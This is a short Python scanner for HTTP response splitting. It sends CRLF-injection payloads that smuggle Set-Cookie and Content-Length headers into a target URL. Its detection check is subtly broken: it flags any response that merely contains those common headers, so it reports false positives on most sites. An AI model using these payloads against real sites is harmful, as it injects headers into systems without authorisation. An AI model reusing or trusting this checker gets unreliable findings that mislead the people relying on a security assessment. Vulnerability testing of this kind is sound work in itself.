import requests

def test_http_response_splitting(url):
    payloads = ["%0d%0aSet-Cookie: test=test", "%0d%0aContent-Length: 0"]
    vulnerabilities = []

    for payload in payloads:
        response = requests.get(url + payload)
        if "Set-Cookie" in response.headers or "Content-Length" in response.headers:
            vulnerabilities.append(url + payload)
    
    return vulnerabilities

if __name__ == "__main__":
    target_url = "http://example.com"
    results = test_http_response_splitting(target_url)
    print(f"Possible HTTP Response Splitting vulnerabilities: {results}")
